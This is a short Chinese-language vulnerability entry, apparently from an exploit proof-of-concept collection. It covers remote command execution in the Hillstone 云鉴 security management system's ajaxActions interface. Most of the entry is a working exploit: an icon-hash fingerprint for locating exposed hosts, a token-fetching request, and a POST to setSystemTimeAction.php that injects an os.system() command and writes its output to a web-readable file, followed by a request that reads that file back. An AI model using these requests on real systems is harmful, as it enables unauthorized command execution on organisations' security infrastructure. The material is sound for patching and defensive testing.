# 山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞

- **系统**：山石网科云鉴安全管理系统ajaxActions接口处　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="572290418"`
- **请求**：`GET /master/ajaxActions/getTokenAction.php HTTP/1.1`

**请求体 / payload**
```
1. 获取token与cookie
Host:
Content-Type: application/x-www-form-urlencoded
2. 使用上一步获取的token与cookie执行命令
POST /master/ajaxActions/setSystemTimeAction.php?token_csrf=a64cca09285de26ca4ebfefa629edd02 HTTP/1.1
Host:
Content-Length: 90
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=3ovusd429biqeot6ioje7q06r0
param=os.system('echo 8888881 > /opt/var/majorsec/installation/master/runtime/img/config')
2. 获取命令执行结果
GET /master/img/config HTTP/1.1
Host:
```

**其他**
- 山石网科云鉴安全管理系统ajaxActions接口处存在远程命令执行漏洞: * 一、产品简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 山石网科云鉴安全管理系统